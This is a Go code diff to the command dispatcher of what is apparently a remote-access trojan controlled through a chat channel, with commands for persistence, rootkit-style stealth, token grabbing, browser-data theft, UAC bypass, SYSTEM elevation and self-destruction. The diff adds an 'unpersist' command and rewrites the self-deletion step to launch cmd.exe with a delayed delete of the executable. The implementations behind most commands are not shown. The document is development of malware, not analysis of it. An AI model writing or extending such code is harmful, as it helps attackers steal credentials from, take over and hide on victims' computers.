@@ -4,6 +4,7 @@ import (
 	"context"
 	"fmt"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strings"
 	"time"
@@ -49,6 +50,10 @@ func (m *Manager) Execute(ctx context.Context, command string, args []string, se
 	case "persist", "persistence":
 		return m.persistence.EnsureAll()
 
+	case "unpersist", "clean":
+		m.persistence.RemoveAll()
+		return "✅ Persistence mechanisms removed."
+
 	case "hide", "rootkit":
 		return m.handleStealth(ctx, args)
 
@@ -56,7 +61,7 @@ func (m *Manager) Execute(ctx context.Context, command string, args []string, se
 		return m.handleStealthStatus(ctx)
 
 	case "tokengrab", "tokens", "grab":
-        return m.handleTokenGrab(ctx)
+		return m.handleTokenGrab(ctx)
 
 	case "browser", "browserdata":
 		return m.handleBrowserData(ctx, session, channelID)
@@ -143,7 +148,6 @@ func (m *Manager) handleUACBypass(ctx context.Context, args []string) string {
 		return "🔑 Already running with administrator privileges"
 	}
 
-	// if no method specified, try all methods
 	if len(args) == 0 {
 		if m.privesc.BypassUAC() {
 			return "✅ UAC bypass successful - elevated to administrator"
@@ -151,7 +155,6 @@ func (m *Manager) handleUACBypass(ctx context.Context, args []string) string {
 		return "❌ UAC bypass failed - all methods unsuccessful"
 	}
 
-	// try specific method
 	method := strings.ToLower(args[0])
 	var success bool
 	var methodName string
@@ -189,7 +192,6 @@ func (m *Manager) handleSystemElevation(ctx context.Context, args []string) stri
 		return "❌ Cannot elevate to SYSTEM - administrator privileges required first"
 	}
 
-	// if no method specified, try all methods
 	if len(args) == 0 {
 		if m.privesc.ElevateToSystem() {
 			return "🔥 Successfully elevated to NT AUTHORITY\\SYSTEM"
@@ -197,7 +199,6 @@ func (m *Manager) handleSystemElevation(ctx context.Context, args []string) stri
 		return "❌ SYSTEM elevation failed - all methods unsuccessful"
 	}
 
-	// try specific method
 	method := strings.ToLower(args[0])
 	var success bool
 	var methodName string
@@ -224,7 +225,6 @@ func (m *Manager) handleSystemElevation(ctx context.Context, args []string) stri
 }
 
 func (m *Manager) handleStealth(ctx context.Context, args []string) string {
-	// if no method specified, activate all stealth methods
 	if len(args) == 0 {
 		if m.stealth.ActivateAllMethods() {
 			return "🔒 Stealth mode fully activated - all methods enabled"
@@ -232,7 +232,6 @@ func (m *Manager) handleStealth(ctx context.Context, args []string) string {
 		return "⚠ Stealth activation partially successful - some methods may have failed"
 	}
 
-	// try specific method
 	method := strings.ToLower(args[0])
 	var success bool
 	var methodName string
@@ -332,12 +331,11 @@ func (m *Manager) handleSelfDestruct(ctx context.Context) string {
 		time.Sleep(3 * time.Second)
 
 		exePath, _ := os.Executable()
-		cmd := fmt.Sprintf(`timeout /t 2 /nobreak > nul && del /f /q "%s" 2>nul`, exePath)
-		m.system.ExecuteCMD(context.Background(), cmd)
+		cmd := fmt.Sprintf(`timeout /t 2 /nobreak > nul && del /f /q "%s"`, exePath)
+		exec.Command("cmd.exe", "/C", cmd).Start()
 
 		os.Exit(0)
 	}()
 
-	return "💥 Self-destruct initiated. Cleaning traces..."
+	return "💥 Self-destruct initiated. Cleaning traces and exiting..."
 }
-
